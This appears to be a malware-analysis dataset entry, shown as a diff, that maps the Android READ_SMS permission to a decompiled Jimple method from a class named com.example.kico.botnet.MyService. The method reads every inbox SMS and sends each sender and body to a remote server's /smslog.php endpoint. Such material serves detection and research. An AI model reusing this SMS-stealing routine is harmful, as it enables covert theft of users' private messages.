@@ -1,0 +1,188 @@
+Permission: android.permission.READ_SMS android.content.ContentResolver content://sms
+uri: content://sms
+package name: android.content.ContentResolver
+Method body:
+    public void refreshSmsInbox() throws java.io.IOException
+    {
+        com.example.kico.botnet.MyService $r0;
+        android.content.ContentResolver $r1;
+        android.net.Uri $r2;
+        android.database.Cursor $r3;
+        int $i0, $i1, $i2;
+        boolean $z0;
+        android.widget.ArrayAdapter $r4;
+        java.lang.StringBuilder $r5, r16;
+        java.lang.String $r6, $r8;
+        org.apache.http.HttpResponse $r7, $r12;
+        java.lang.Throwable $r9, $r13;
+        org.apache.http.impl.client.DefaultHttpClient $r10, r17;
+        org.apache.http.client.methods.HttpGet $r11, r18;
+        org.apache.http.StatusLine $r14;
+        org.apache.http.HttpEntity $r15;
+        java.io.UnsupportedEncodingException r19;
+        java.io.IOException r20;
+
+        $r0 := @this: com.example.kico.botnet.MyService;
+
+        $r1 = virtualinvoke $r0.<com.example.kico.botnet.MyService: android.content.ContentResolver getContentResolver()>();
+
+        $r2 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/inbox");
+
+        $r3 = virtualinvoke $r1.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r2, null, null, null, null);
+
+        $i0 = interfaceinvoke $r3.<android.database.Cursor: int getColumnIndex(java.lang.String)>("body");
+
+        $i1 = interfaceinvoke $r3.<android.database.Cursor: int getColumnIndex(java.lang.String)>("address");
+
+        if $i0 < 0 goto label15;
+
+        $z0 = interfaceinvoke $r3.<android.database.Cursor: boolean moveToFirst()>();
+
+        if $z0 != 0 goto label01;
+
+        return;
+
+     label01:
+        $r4 = $r0.<com.example.kico.botnet.MyService: android.widget.ArrayAdapter arrayAdapter>;
+
+        virtualinvoke $r4.<android.widget.ArrayAdapter: void clear()>();
+
+     label02:
+        r16 = new java.lang.StringBuilder;
+
+        $r5 = r16;
+
+        specialinvoke r16.<java.lang.StringBuilder: void <init>()>();
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("SMS From: ");
+
+        $r6 = interfaceinvoke $r3.<android.database.Cursor: java.lang.String getString(int)>($i1);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n");
+
+        $r6 = interfaceinvoke $r3.<android.database.Cursor: java.lang.String getString(int)>($i0);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n");
+
+        $r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>();
+
+        $r4 = $r0.<com.example.kico.botnet.MyService: android.widget.ArrayAdapter arrayAdapter>;
+
+        virtualinvoke $r4.<android.widget.ArrayAdapter: void add(java.lang.Object)>($r6);
+
+        $r6 = virtualinvoke $r0.<com.example.kico.botnet.MyService: java.lang.String getUrid()>();
+
+        $r7 = null;
+
+        r16 = new java.lang.StringBuilder;
+
+        $r5 = r16;
+
+     label03:
+        specialinvoke r16.<java.lang.StringBuilder: void <init>()>();
+
+     label04:
+        $r8 = $r0.<com.example.kico.botnet.MyService: java.lang.String http>;
+
+     label05:
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r8);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("/smslog.php?id=");
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&address=");
+
+        $r6 = interfaceinvoke $r3.<android.database.Cursor: java.lang.String getString(int)>($i0);
+
+        $r6 = staticinvoke <java.net.URLEncoder: java.lang.String encode(java.lang.String,java.lang.String)>($r6, "UTF-8");
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&message=");
+
+        $r6 = interfaceinvoke $r3.<android.database.Cursor: java.lang.String getString(int)>($i1);
+
+        $r6 = staticinvoke <java.net.URLEncoder: java.lang.String encode(java.lang.String,java.lang.String)>($r6, "UTF-8");
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6);
+
+        $r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>();
+
+     label06:
+        goto label08;
+
+     label07:
+        $r9 := @caughtexception;
+
+        r19 = (java.io.UnsupportedEncodingException) $r9;
+
+        virtualinvoke r19.<java.io.UnsupportedEncodingException: void printStackTrace()>();
+
+        $r6 = null;
+
+     label08:
+        r17 = new org.apache.http.impl.client.DefaultHttpClient;
+
+        $r10 = r17;
+
+        specialinvoke r17.<org.apache.http.impl.client.DefaultHttpClient: void <init>()>();
+
+        r18 = new org.apache.http.client.methods.HttpGet;
+
+        $r11 = r18;
+
+        specialinvoke r18.<org.apache.http.client.methods.HttpGet: void <init>(java.lang.String)>($r6);
+
+     label09:
+        $r12 = interfaceinvoke $r10.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r11);
+
+     label10:
+        $r7 = $r12;
+
+        goto label12;
+
+     label11:
+        $r13 := @caughtexception;
+
+        r20 = (java.io.IOException) $r13;
+
+        virtualinvoke r20.<java.io.IOException: void printStackTrace()>();
+
+     label12:
+        $r14 = interfaceinvoke $r7.<org.apache.http.HttpResponse: org.apache.http.StatusLine getStatusLine()>();
+
+        $i2 = interfaceinvoke $r14.<org.apache.http.StatusLine: int getStatusCode()>();
+
+        if $i2 != 200 goto label13;
+
+        $r15 = interfaceinvoke $r7.<org.apache.http.HttpResponse: org.apache.http.HttpEntity getEntity()>();
+
+        $r6 = staticinvoke <org.apache.http.util.EntityUtils: java.lang.String toString(org.apache.http.HttpEntity)>($r15);
+
+        staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>("Server response", $r6);
+
+        goto label14;
+
+     label13:
+        staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>("Server response", "Failed to get server response");
+
+     label14:
+        $z0 = interfaceinvoke $r3.<android.database.Cursor: boolean moveToNext()>();
+
+        if $z0 != 0 goto label02;
+
+     label15:
+        return;
+
+        catch java.io.UnsupportedEncodingException from label03 to label04 with label07;
+        catch java.io.UnsupportedEncodingException from label05 to label06 with label07;
+        catch java.io.IOException from label09 to label10 with label11;
+    }
+
+
+
